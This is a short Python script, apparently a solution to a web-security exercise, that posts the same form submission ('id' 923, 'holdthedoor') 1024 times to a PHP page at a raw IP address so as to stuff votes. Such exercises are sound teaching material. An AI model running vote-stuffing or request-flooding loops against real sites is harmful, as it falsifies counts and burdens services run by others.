#!/usr/bin/python3
import requests

posturl = "http://158.69.76.135/level0.php"

for i in range(1024):
    requests.post(
        posturl,
        data={'id': '923', 'holdthedoor': 'Submit'}
    )
